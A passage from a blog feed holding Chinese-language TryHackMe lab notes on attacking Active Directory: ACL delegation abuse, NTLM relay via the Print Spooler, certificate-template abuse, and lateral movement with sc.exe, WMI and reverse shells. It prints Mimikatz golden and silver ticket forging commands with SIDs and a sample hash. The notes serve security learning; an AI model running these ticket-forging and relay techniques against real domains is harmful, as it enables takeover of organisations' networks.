    
    <content type="html"><![CDATA[<p>接着上文的横向移动完结  <strong>开始新的利用AD域</strong></p><p>Delegation—————-</p><h2 id="环境配置不讲了"><a href="#环境配置不讲了" class="headerlink" title="环境配置不讲了"></a>环境配置不讲了</h2><h2 id="利用权限委托-Exploiting-Permission-Delegation"><a href="#利用权限委托-Exploiting-Permission-Delegation" class="headerlink" title="利用权限委托(Exploiting Permission Delegation)"></a>利用权限委托(Exploiting Permission Delegation)</h2><p>这个考察的就是委派   </p><p>Active Directory 可以通过称为权限委派的功能委派权限和特权（不要与下一个任务中将讨论的 Kerberos 委派混淆）。授权是AD在组织中如此强大的原因。想象一下，我们为一个拥有 50000 名员工的组织工作。由于我们关心安全性，因此我们只有三个用户可以访问 DA 凭据。这三个用户不可能处理来自用户的所有请求，例如重置其密码。使用委派，我们可以将强制更改用户密码的权限委派给支持团队，这意味着他们现在具有此特定功能的委派权限。原则上，为了保证授权的安全，应遵循最小特权原则。然而，在大型组织中，这说起来容易做起来难。在此任务中，我们将研究如何利用一些委派错误配置</p><p>权限委派攻击通常称为基于 ACL 的攻击。AD 允许管理员配置填充任意访问控制列表 （DACL） 的访问控制项 （ACE），因此称为基于 ACL 的攻击。几乎任何 AD 对象都可以使用 ACE 进行保护，然后 ACE 描述任何其他 AD 对象对目标对象具有的允许和拒绝的权限。</p><p>这里使用的话就是在使用<code>Sharphound.ps1</code>脚本获取道整个域的信息后  然后使用<code>Bloodhound</code>GUI软件进行分析  然后找到可以利用的地方</p><p>然后找到了一个IT组被委派了一个能强制修改第二组管理员密码的权限  然后我们就可以利用这一点  不小心获取一个凭证后<strong>(要有这个能添加域组的权限的用户)</strong> 我们就把我们自己加到这个IT组里  然后强制修改管理员的密码 然后进行破坏</p><p><strong>这里使用的是这个能强制修改密码的委派  接下来讲一下这个使用AD验证登录协议之一的Kerberos的协议来进行委派</strong></p><h2 id="利用-Kerberos-委派"><a href="#利用-Kerberos-委派" class="headerlink" title="利用 Kerberos 委派"></a>利用 Kerberos 委派</h2><ul><li>无约束状态</li></ul><p><strong>简单来说就是干啥都行</strong> </p><ul><li>基于资源的约束委派</li></ul><p><strong>这个改变了以前的访问规则  就是不在需要使用AD管理用户登录来访问特定资源了  现在就变成了我们现在熟知的委派某个用户有这个权限能访问了</strong></p><ul><li>受约束的委派利用</li></ul><p><strong>就是目前我们所了解的委派  被AD管理员授予啥权限就能干啥 不授权就干不了  有个坏处就可以伪造TGT票据来给某个生成TGS来登录到该用户</strong></p><p><img src="../images/image-20230912115858258.png" alt="image-20230912115858258"></p><p>这里能使用该用户来登录这台计算机的原理</p><p><img src="../images/image-20230912115938440.png" alt="image-20230912115938440"></p><h2 id="Exploiting-Automated-Relays-自动化中继攻击"><a href="#Exploiting-Automated-Relays-自动化中继攻击" class="headerlink" title="Exploiting Automated Relays(自动化中继攻击)"></a>Exploiting Automated Relays(自动化中继攻击)</h2><p>“Exploiting Automated Relays” 可能是指利用自动化中继的漏洞或弱点来进行攻击。自动化中继是指在网络通信中使用的一种机制，用于自动转发或中继数据包。攻击者可能会利用自动化中继的漏洞或配置错误来获取未授权的访问、窃取敏感信息或执行恶意操作。</p><p>这里的话thm讲的不够细致</p><h3 id="身份验证中继来获取这个管理员权限的方法"><a href="#身份验证中继来获取这个管理员权限的方法" class="headerlink" title="身份验证中继来获取这个管理员权限的方法"></a>身份验证中继来获取这个管理员权限的方法</h3><p>想要使用这个方法的话  必须是要满足四个条件</p><ol><li>A valid set of AD account credentials.<br>一组有效的 AD 帐户凭据。</li><li>Network connectivity to the target’s SMB service.<br>与目标的 SMB 服务的网络连接。</li><li>The target host must be running the Print Spooler service.<br>目标主机必须运行后台打印程序服务。</li><li>The hosts must not have SMB signing enforced.<br>主机不得强制实施 SMB 签名。</li></ol><p>这里的话是thm已经写好了</p><p>接下来是讲一下在使用过程中使用的<a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a>这个工具 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample 是一种工具，旨在利用 Windows 操作系统中的身份验证中继漏洞（也称为 NTLM 中继攻击）来实施攻击。这种攻击利用了 Windows 中的 NTLM（NT LAN Manager）身份验证过程中的设计缺陷，从而使攻击者能够获得受害者的凭据并进一步访问系统。</span><br><span class="line">具体来说，SpoolSample 利用了 Windows 中打印机服务（Spooler）的漏洞。攻击者可以通过在网络上放置恶意的打印机服务器，将受害者的网络流量重定向到攻击者控制的服务器上。当受害者尝试连接到网络上的打印机时，其 NTLM 身份验证流量将被中继到攻击者的服务器，攻击者可以通过该流量获取受害者的凭据。</span><br><span class="line">攻击者获取到受害者的凭据后，可以进一步横向移动在网络中，访问其他系统和资源，甚至获取管理员权限。这种攻击技术对于那些未修补或配置不当的系统来说是一种威胁。</span><br><span class="line">因此，使用 SpoolSample 来利用身份验证中继的目的是获取受害者的凭据，以便进一步滥用其权限并访问系统和数据。这凸显了修补系统漏洞、正确配置身份验证过程以及网络安全的重要性。</span><br></pre></td></tr></table></figure><p>这样的话我们就可以强行对管理员账户进行身份验证  这样的话我们就可以获取到管理员的NTLM—hash值</p><p><img src="../images/image-20230912171139557.png" alt="image-20230912171139557"></p><p>这个设置的话是搭建一个恶意的SMB服务器</p><p><img src="../images/image-20230912171415684.png" alt="image-20230912171415684"></p><p>这个的话是强制使其THMSERVER2开启打印后台处理程序服务  然后向我们构造的这个恶意SMB服务器进行身份验证</p><p><img src="../images/image-20230912171511946.png" alt="image-20230912171511946"></p><p>然后恶意服务器这边就会收到THMSERVER2的hash值及其他信息</p><p>这个获取到账号的hash值后  可以使用evil-winrm来远程登录该用户  不需要进行用户hash密码的破解</p><p><strong>winrm这个工具的作用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WinRM（Windows Remote Management）是一种用于在 Windows 操作系统上进行远程管理和操作的协议和服务。它允许管理员通过网络远程管理和控制 Windows 主机，而无需直接物理访问或登陆到每台主机上。</span><br><span class="line">WinRM 提供了一种安全的远程通信机制，基于标准的 Web Services 协议（SOAP）和 HTTP/HTTPS。它允许管理员使用命令行工具、脚本或管理工具通过网络远程执行命令、配置设置、获取系统信息、安装更新、监视事件日志等操作。WinRM 还支持通过 PowerShell 进行远程管理，使管理员能够使用 PowerShell 脚本来批量管理远程主机。</span><br><span class="line">WinRM 是在 Windows Server 2003 和 Windows Vista 之后的操作系统中默认安装的，并且可以通过配置和启用相应的服务来支持远程管理功能。它提供了一种方便、高效和安全的方式来管理和操作远程 Windows 主机，特别适用于大规模部署、远程服务器管理和自动化任务。</span><br><span class="line">需要注意的是，使用 WinRM 进行远程管理需要确保适当的安全配置，包括使用安全的通信协议和身份验证机制，限制访问权限，以及监控和审核远程管理活动，以确保系统的安全性和保密性。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单来说就是可以远程通过命令行来操作计算机</p><h2 id="Exploiting-AD-Users-利用AD用户"><a href="#Exploiting-AD-Users-利用AD用户" class="headerlink" title="Exploiting AD Users(利用AD用户)"></a>Exploiting AD Users(利用AD用户)</h2><p>这个就是在拿下一台计算机后 我们可以挨个在这几个用户之间切换来查看 看看也没有啥有用的信息  这里的话是获取到了一个数据库信息  下载到本地  然后使用keepass进行查看</p><p>这里有个骚操作就是通过弹shell 然后使用mterpreter来执行键盘操作记录 来获取到用户的密码</p><h2 id="Exploiting-GPOs"><a href="#Exploiting-GPOs" class="headerlink" title="Exploiting GPOs"></a>Exploiting GPOs</h2><p>对GPO进行解释 </p><p><img src="../images/image-20230912190812631.png" alt="image-20230912190812631"></p><p>就是可以给某个用户赋予权限  想让其能干啥就干啥</p><p>没啥想写的了 这里的话就是直接查看thm就行了</p><h2 id="利用证书"><a href="#利用证书" class="headerlink" title="利用证书"></a>利用证书</h2><p>这里的话是我们可以利用错误的证书模板来进行权限提升和横向移动</p><h3 id="AD-Certificate-Services-广告证书服务"><a href="#AD-Certificate-Services-广告证书服务" class="headerlink" title="AD Certificate Services 广告证书服务"></a>AD Certificate Services 广告证书服务</h3><p>AD 证书服务 （CS） 是 Microsoft 的公钥基础结构 （PKI） 实现。由于AD在组织中提供了一定程度的信任，因此它可以用作CA来证明和委托信任。AD CS用于多种用途，例如加密文件系统，创建和验证数字签名，甚至<strong>用户身份验证</strong>，使其成为攻击者的有前途的途径。</p><p>重要的是这个用户身份验证这一点  这一点的话是可以利用错误的模板配置来进行利用的</p><p>由于 AD CS 是一项特权功能，因此它通常在选定的域控制器上运行。这意味着普通用户无法真正直接与服务交互。另一方面，组织往往太大，无法让管理员手动创建和分发每个证书。这就是证书模板的用武之地。AD CS 的管理员可以创建多个模板，这些模板可以允许具有相关权限的任何用户自行请求证书。这些模板具有指示哪个用户可以请求证书以及所需内容的参数。SpecterOps发现，这些参数的特定组合可能具有难以置信的毒性，并被滥用于权限提升和持久访问。</p><p><img src="../images/image-20230913095606719.png" alt="image-20230913095606719"></p><h3 id="可以恶意利用的模板"><a href="#可以恶意利用的模板" class="headerlink" title="可以恶意利用的模板"></a>可以恶意利用的模板</h3><p><img src="../images/image-20230913095644596.png" alt="image-20230913095644596"></p><p>在此模板中，我们可以看到THMSERVER2的计算机帐户可以为模板颁发<strong>CSR</strong>，该模板允许我们指定主题备用名称（SAN）并可用于<strong>客户端身份验证</strong>。</p><p>就是因为这一点  所以就是会进行横向移动到AD管理员账户</p><p>因为这里的话是我们已经拿下这个<code>THMSERVER2</code>这台电脑了  并且就是已经开启了RDP  于是我们进行登录  然后请求证书</p><p>在请求证书的时候要记得一点就是 </p><p><img src="../images/image-20230913095945573.png" alt="image-20230913095945573"></p><p>因为我们的目的是为了登录到AD管理员账户 于是我们就得模拟用户的名字写上去</p><p>然后我们在使用私钥导出我们生成好的证书</p><h3 id="使用证书进行用户模拟"><a href="#使用证书进行用户模拟" class="headerlink" title="使用证书进行用户模拟"></a>使用证书进行用户模拟</h3><p>现在我们终于可以模拟用户了。要执行此操作，需要两个步骤：</p><ul><li>Use the certificate to request a Kerberos ticket-granting ticket (TGT)<br>使用证书请求 Kerberos 票证授予票证 （TGT）</li><li>Load the Kerberos TGT into your hacking platform of choice<br>将 Kerberos TGT 加载到您选择的黑客平台中</li></ul><p>使用的是这个工具 <code>Rubeus</code>来进行TGT证书的生成 </p><p>现在我们可以使用Mimikatz加载TGT并向THMDC进行身份验证：</p><p>这样的话就是可以拿下域控了</p><h2 id="Exploiting-Domain-Trusts-利用域信任"><a href="#Exploiting-Domain-Trusts-利用域信任" class="headerlink" title="Exploiting Domain Trusts(利用域信任)"></a>Exploiting Domain Trusts(利用域信任)</h2><p>这里的话将会讲到我们之前听说过但是没怎么研究过的<strong>黄金  白银票据</strong></p><p>这个模块的基于子域向根域移动的操作</p><p><strong>(因为要获取这个krbtgt-hash只能在AD域管理员上获取)</strong></p><p>(在上一个模块中  我们拿到的仅仅是这个za子域的域控权限  我们的目的是想拿下整个域的权限 就是TRYHACKME.LOC)</p><p>因为这里的话子域和根域的信任是双向的  所以我们就可以通过子域来直接访问根域</p><p>可以在域之间配置两种主要类型的信任：</p><ul><li>Directional - The direction of the trust flows from a trusting domain to a trusted domain<br>定向 - 信任的方向从信任域流向受信任域</li><li>Transitive - The trust relationship expands beyond just two domains to include other trusted domains<br>可传递 - 信任关系从两个域扩展到包括其他受信任域</li></ul><p><strong>解释一下这两种信任关系的区别</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在域（Domain）环境中，定向信任（One-Way Trust）和传递信任（Transitive Trust）是两种不同类型的信任关系。它们的主要区别在于信任的方向和传递性。</span><br><span class="line">定向信任（One-Way Trust）： 定向信任是指在两个域之间建立的单向信任关系。其中一个域（称为信任源域）信任另一个域（称为信任目标域），但反过来不一定成立。这意味着，信任源域中的用户可以访问信任目标域中的资源，但信任目标域中的用户无法访问信任源域中的资源。</span><br><span class="line">例如，假设有域 A 和域 B，域 A 信任域 B。这意味着域 A 中的用户可以访问域 B 中的资源，但域 B 中的用户不能访问域 A 中的资源。这种信任关系通常用于实现跨域访问的场景，其中一个域的用户需要访问另一个域中的资源。</span><br><span class="line">传递信任（Transitive Trust）： 传递信任是指在多个域之间建立的相互信任关系，信任关系在域之间传递。当两个域之间存在传递信任时，信任可以在域之间传递，形成一个信任路径，从而实现跨域访问。</span><br><span class="line">例如，假设有域 A、域 B 和域 C，域 A 信任域 B，域 B 信任域 C。由于信任是传递性的，域 A 也会信任域 C。这意味着域 A 中的用户可以访问域 C 中的资源，即使直接的信任关系只存在于域 A 和域 B 之间。</span><br><span class="line">传递信任的优点是能够实现多个域之间的灵活访问，减少了信任配置的复杂性。然而，需要注意的是，信任关系的传递性也可能增加安全风险，因此在配置和管理信任关系时需要谨慎处理。</span><br><span class="line">总结起来，定向信任是单向的，只允许一个域信任另一个域，而传递信任是相互的，允许多个域之间形成信任路径，实现跨域访问。选择使用哪种信任关系取决于具体的需求和安全考虑。</span><br></pre></td></tr></table></figure><h3 id="KRBTGT和黄金门票"><a href="#KRBTGT和黄金门票" class="headerlink" title="KRBTGT和黄金门票"></a>KRBTGT和黄金门票</h3><p><code>krbtgt</code>这个东西大家的话应该都很熟悉  就是在这个<code>Kerberos</code>进行身份验证的流程的时候讲过</p><p>但是，如果我们想生成自己的 TGT 来授予我们访问所有内容的权限怎么办？这被称为<strong>黄金票证攻击</strong>。在黄金票证攻击中，我们完全绕过KDC并创建自己的TGT，本质上成为票证授予服务器（TGS）。为了伪造TGT，我们需要以下信息：</p><ul><li>The FQDN of the domain<br>域的 FQDN</li><li>The Security Identifier (SID) of the domain<br>域的安全标识符 （SID）</li><li>The username of the account we want to impersonate<br>我们要模拟的帐户的用户名</li><li>The KRBTGT password hash KRBTGT 密码哈希</li></ul><p>前三个通常很容易恢复。最后一个需要域泄露，因为 KRBTGT 密码哈希仅存储在域控制器上。幸运的是，我们刚刚使用伪造证书破坏了第 0 层管理员组，因此我们能够恢复 KRBTGT 密码哈希。</p><p>我们将再次使用带有 DC Sync 的 Mimikatz 来恢复 THMSERVER2 上的 KRBTGT 密码哈希：</p><p><strong><code>Sync</code>的话就是如上面所说  就是绕过KDC来自己生成TGT</strong></p><p>由于我们是要利用子域和根域之间的双向信任  所以我们的话就会想要伪造这个 <code>Inter-Realm TGT</code>   (这个就是跨域的TGT)</p><p>当我们构建黄金票证来执行此漏洞时，我们将包含来自其他域的额外帐户 SID。Mimikatz可以协助解决这个问题，允许我们设置Kerberos TGT KERB_VALIDATION_INFO结构的ExtraSids部分。ExtraSids 部分描述为“指向KERB_SID_AND_ATTRIBUTES结构列表的指针，这些结构包含与主体所属帐户域以外的域中的组对应的 SID 列表”。</p><p>这里的关键是，我们将通过将企业管理员 （EA） 组的 SID 作为额外的 SID 添加到子域域控制器的伪造票证中，来利用父域与子域的信任。EA 组属于父域，该组的成员身份实质上授予对整个林的管理权限！此组的默认 SID 为 S-1-5-21—519。</p><p>在进行利用之前，我们首先需要恢复两个 SID：</p><ul><li>The SID of the child domain controller (THMDC), which we will impersonate in our forged TGT<br>子域控制器 （THMDC） 的 SID，我们将在伪造的 TGT 中模拟它</li><li>The SID of the Enterprise Admins in the parent domain, which we will add as an extra SID to our forged TGT<br>父域中企业管理员的 SID，我们将将其作为额外的 SID 添加到伪造的 TGT 中</li></ul><p>然后就使用<code>mimikazt</code>进行生成黄金票据  因为我们分别使用了两个域管理员的SID  所以我们就可以利用双方的双向信任  就可以互相访问了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:&lt;Password hash of krbtgt user&gt; /sids:&lt;SID of Enterprise Admins group&gt; /ptt</span><br></pre></td></tr></table></figure><p>这样的话我们就可以通过这个黄金票据实现横向移动  权限提升了</p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/#%E9%93%B6%E7%A5%A8-SilverTickets">白银票据</a></p><p>这里先讲一下PAC是啥  (因为下面会用到)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在 Active Directory （AD）域环境中，PAC 指的是 Kerberos 预身份验证票据（Privilege Attribute Certificate），也称为票据包（Ticket Granting Ticket）。</span><br><span class="line"></span><br><span class="line">PAC 是一种包含有关用户或计算机身份验证和授权信息的数据结构。它是由域控制器颁发给经过身份验证的主体（如用户或计算机）的安全令牌。PAC 中包含了一些重要的信息，如用户的组成员身份、授权信息、委派权限等。</span><br><span class="line"></span><br><span class="line">PAC 的主要作用是在 Kerberos 认证过程中验证和授权用户的访问请求。当用户进行身份验证时，域控制器会为用户生成一个 TGT（Ticket Granting Ticket），其中包含了用户的身份信息和授权信息。该 TGT 会被包装在 PAC 中，然后发送给用户，用户将 PAC 中的 TGT 用于获取服务票据（Service Ticket）以访问特定服务。</span><br><span class="line"></span><br><span class="line">PAC 在 Kerberos 认证过程中起到了重要的作用，它确保了用户的身份和授权信息的安全性和完整性。它还为用户提供了一种验证其身份的方法，并授权其访问特定资源的权限。</span><br><span class="line"></span><br><span class="line">需要注意的是，PAC 是由域控制器生成和管理的，并且在用户进行身份验证时动态生成。由于 PAC 包含了敏感的身份和授权信息，所以需要在传输和存储过程中进行适当的保护和加密，以防止信息泄露和篡改。</span><br><span class="line"></span><br><span class="line">总之，PAC 是 Active Directory 域中用于包含用户身份验证和授权信息的数据结构。它在 Kerberos 认证过程中起到了重要的作用，确保用户的身份和访问权限的安全和完整。</span><br></pre></td></tr></table></figure><p>简单来说就是用户或者计算机的身份令牌</p><p>制作银票条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.域名称</span><br><span class="line">2.域的SID值</span><br><span class="line">3.域中的Server服务器账户的NTLM-Hash</span><br><span class="line">4.伪造的用户名，可以是任意用户名.</span><br><span class="line">5.目标服务器上面的kerberos服务</span><br></pre></td></tr></table></figure><p>白银票据的服务列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote Server    RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure><p>伪造白银票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/domain：当前域名称</span><br><span class="line">/sid：SID值，和金票一样取前面一部分</span><br><span class="line">/target：目标主机，这里是OWA2010SP3.0day.org</span><br><span class="line">/service：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line">/rc4：目标主机的HASH值</span><br><span class="line">/user：伪造的用户名</span><br><span class="line">/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt</span><br></pre></td></tr></table></figure><p><code>klist</code>可以查看是否成功导入</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;接着上文的横向移动完结  &lt;strong&gt;开始新的利用AD域&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Delegation—————-&lt;/p&gt;
&lt;h2 id=&quot;环境配置不讲了&quot;&gt;&lt;a href=&quot;#环境配置不讲了&quot; class=&quot;headerlink&quot; title=&quot;环境配置不讲了</summary>
      
    
    
    
    
    <category term="thm-利用AD域" scheme="https://ke1nys.github.io/tags/thm-%E5%88%A9%E7%94%A8AD%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>thm-windows横向移动和翻转</title>
    <link href="https://ke1nys.github.io/posts/e2befe4.html"/>
    <id>https://ke1nys.github.io/posts/e2befe4.html</id>
    <published>2023-09-08T09:06:24.000Z</published>
    <updated>2023-09-09T12:11:42.438Z</updated>
    
    <content type="html"><![CDATA[<p>接上一课的枚举AD域信息后<strong>(就是域的信息收集</strong>)  开始进行横向移动和翻转了</p><h2 id="网络移动-横向移动"><a href="#网络移动-横向移动" class="headerlink" title="网络移动 (横向移动)"></a>网络移动 (横向移动)</h2><p>简而言之，横向移动是攻击者用来在网络中移动的一组技术。一旦攻击者获得对网络第一台计算机的访问权，出于多种原因，移动就变得至关重要，其中包括： - 实现攻击者的目标 - 绕过现有的网络限制 - 建立额外的网络入口点 - 制造混乱和避免被发现。</p><p>虽然许多网络杀伤链将横向移动视为线性过程的附加步骤，但它实际上是循环的一部分。在此周期中，我们使用任何可用的凭据来执行横向移动，使我们能够访问新机器，在其中我们可以提升权限并提取凭据（如果可能）。有了新的凭证，循环又开始了。</p><p><img src="../images/beccc46f65b8d16117d3d62f5c5dc380.png" alt="img"></p><p>通常，我们会重复这个循环几次，然后才能达到网络上的最终目标。如果我们的第一个立足点是一台几乎无法访问其他网络资源的计算机，那么我们可能需要横向移动到在网络上拥有更多权限的其他主机。</p><h3 id="A-Quick-Example-一个简单的例子"><a href="#A-Quick-Example-一个简单的例子" class="headerlink" title="A Quick Example 一个简单的例子"></a>A Quick Example 一个简单的例子</h3><p>假设我们正在执行红队参与，我们的最终目标是到达内部代码存储库，我们通过网络钓鱼活动在目标网络上获得了第一次妥协。通常，网络钓鱼活动对非技术用户更有效，因此我们的第一次访问可能是通过营销部门的机器进行的。</p><p>营销工作站通常会受到防火墙策略的限制，无法访问网络上的任何关键服务，包括管理协议、数据库端口、监控服务或日常工作不需要的任何其他服务，包括代码存储库。</p><p>为了到达敏感的主机和服务，我们需要转移到其他主机并从那里转向我们的最终目标。为此，我们可以尝试提升营销工作站的权限并提取本地用户的密码哈希值。如果我们找到本地管理员，则其他主机上可能存在相同的帐户。经过一番侦察，我们发现了一个名为 DEV-001-PC 的工作站。我们使用本地管理员的密码哈希来访问 DEV-001-PC，并确认它属于公司的一位开发人员所有。从那里，可以访问我们的目标代码存储库。</p><p><img src="../images/89ef601e2332f96e45c64b3baa8d6349.png" alt="Simple Lateral Movement"></p><p>请注意，虽然可能需要使用横向移动来规避防火墙限制，但它也有助于逃避检测。在我们的示例中，即使营销工作站可以直接访问代码存储库，也可能需要通过开发人员的 PC 进行连接。从检查登录审核日志的蓝队分析师的角度来看，这种行为的可疑性较小。</p><h3 id="攻击者的视角"><a href="#攻击者的视角" class="headerlink" title="攻击者的视角"></a>攻击者的视角</h3><p>攻击者可以通过多种方式进行横向移动。最简单的方法是使用标准管理协议（例如 WinRM、RDP、VNC 或 SSH）连接到网络上的其他计算机。只要在规划与哪个帐户连接的位置时保持一定的一致性，这种方法就可以在某种程度上模拟常规用户的行为。虽然 IT 部门的用户通过 RDP 连接到 Web 服务器可能很常见并且不会受到关注，但必须注意不要尝试可疑的连接（例如，为什么本地管理员用户从营销部门连接到 DEV-001-PC）个人电脑？）</p><p>如今，攻击者还可以使用其他横向移动方法，同时使蓝队有效检测正在发生的情况变得更具挑战性。虽然没有任何技术应该被认为是万无一失的，但我们至少可以尝试尽可能保持沉默。在接下来的任务中，我们将了解一些最常见的横向运动技术。</p><h2 id="Administrators-and-UAC"><a href="#Administrators-and-UAC" class="headerlink" title="Administrators and UAC"></a>Administrators and UAC</h2><p>在执行整个房间中介绍的大部分横向移动技术时，我们将主要使用管理员凭据。虽然人们可能期望每个管理员帐户都具有相同的目的，但必须区分两种类型的管理员：</p><ul><li>Local accounts part of the local Administrators group<br>本地帐户属于本地管理员组</li><li>Domain accounts part of the local Administrators group<br>域帐户属于本地管理员组</li></ul><h2 id="远程生成进程"><a href="#远程生成进程" class="headerlink" title="远程生成进程"></a>远程生成进程</h2><p>这一共是有三种方法可以来进行</p><ul><li><p>Psexec 执行程序</p></li><li><p>使用 WinRM 远程创建进程</p></li><li>使用 sc 远程创建服务</li></ul><p><strong>服务的概念</strong></p><p>在Windows操作系统中，服务（Service）是一种在后台运行的程序或进程，它可以执行各种系统任务、管理资源、提供功能或服务。服务通常在系统启动时自动启动，并在后台持续运行，不需要用户干预。</p><p>服务可以是操作系统自带的，也可以是第三方软件安装时创建的。它们可以执行各种任务，例如网络连接、打印机管理、安全性控制、文件共享等。服务通常以独立的进程运行，拥有自己的权限和配置设置。</p><p>你可以通过服务管理器（Services Manager）来查看、启动、停止、暂停或更改服务的配置。在Windows操作系统中，你可以通过服务来管理系统的各种功能和任务，确保系统的正常运行和提供所需的服务。</p><p>请注意，对于一些高级或敏感的服务，修改或停止它们可能需要管理员权限或特殊的访问权限。</p><p>这里的话我主要总结一下这个thm的操作流程 是<strong>怎么一步一步横向移动到管理员iis这个域的</strong></p><p>首先了 我们通过各种各样的方法 获取到了两个凭证 </p><ul><li>一个是别的域的普通用户</li><li>一个是IIS域的管理用户</li></ul><p><strong>我们这里使用的sc.exe来在管理用户的电脑下创建一个恶意服务   以下是过程</strong></p><p>首先我们现在自己的linux机器上使用msfvenom创建一个恶意服务exe文件</p><p>然后使用smb协议使其传送到 THMIIS 域的 ADMIN$ 共享(就是管理员账户下的)</p><p>然后监听这个恶意服务的端口</p><p>因为使用这个sc.exe来创建服务的需要管理员权限  我们目前只能ssh普通用户</p><p>因为我们有了这个管理员的凭证 所以可以使用之前学到的runas这个工具 来使用这个管理员账户的权限 并且使用的一些指令就不用继续验证凭证了(<strong>说明只有管理员能执行的指令我们也能了</strong>)</p><p>那么我们就进行nc命令 在自己的linux主机下进行监听  </p><p>那么这个反弹shell的话就能反弹到管理员权限的shell了</p><p>(这里收到)</p><p>那么我们就能执行sc.exe来创建服务了 然后在运行 之前监听恶意服务的linux主机就会收到 然后就能访问管理员账户的主机里的任何内容了</p><p><strong>(这里使用这个反弹shell来获取管理员账户是因为这个nc命令的话执行需要管理员权限)</strong></p><h2 id="使用-WMI-横向移动"><a href="#使用-WMI-横向移动" class="headerlink" title="使用 WMI 横向移动"></a>使用 WMI 横向移动</h2><p>这个的话我觉得比上面的那个sc.exe方法更加方便</p><p>使用条件和上面的那个sc.exe方法差不多</p><ul><li>都是得获取到两个账户 一个是管理员一个是普通用户  </li><li>但是这里少了一步就是需要弹shell获取到这个system32</li><li>所以就方便在了这里</li></ul><h2 id="使用替代认证材料"><a href="#使用替代认证材料" class="headerlink" title="使用替代认证材料"></a>使用替代认证材料</h2><p>这个的话主要讲的就是这个AD域的两种身份验证登录协议</p><ul><li>NTLM</li><li>Kerberos</li></ul><p>一共就是这两种协议 </p><p>先是了解一下这两种协议的认证过程 </p><ul><li>NTLM是拿NTLM—hash值来进行认证登录</li><li>Kerberos是拿票据来进行认证登录 </li></ul><p>在这两者之间就是如果获取到了 hash值 就是不用使用密码就可以进行登录了 </p><p><strong>(就是从普通用户  直接登录到管理员用户)</strong></p><h2 id="滥用用户行为"><a href="#滥用用户行为" class="headerlink" title="滥用用户行为"></a>滥用用户行为</h2><p>这里主要讲的就是三种方法</p><ul><li>就是在网络共享下 可能管理员会共享一些脚本或者exe文件</li><li>rdp劫持</li></ul><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><ul><li><p>ssh远程端口代理</p></li><li><p>ssh本地端口代理</p></li><li>socks端口代理</li><li>socat端口代理</li><li>隧道复杂漏洞<strong>(把上面的各种代理方法拿出来组合起来用)</strong></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;接上一课的枚举AD域信息后&lt;strong&gt;(就是域的信息收集&lt;/strong&gt;)  开始进行横向移动和翻转了&lt;/p&gt;
&lt;h2 id=&quot;网络移动-横向移动&quot;&gt;&lt;a href=&quot;#网络移动-横向移动&quot; class=&quot;headerlink&quot; title=&quot;网络移动 (横向移动)&quot;</summary>
      
    
    
    
    
    <category term="thm-windows横向移动和翻转" scheme="https://ke1nys.github.io/tags/thm-windows%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E7%BF%BB%E8%BD%AC/"/>
    
  </entry>
  
  <entry>
    <title>thm-枚举AD域</title>
    <link href="https://ke1nys.github.io/posts/180ab89e.html"/>
    <id>https://ke1nys.github.io/posts/180ab89e.html</id>
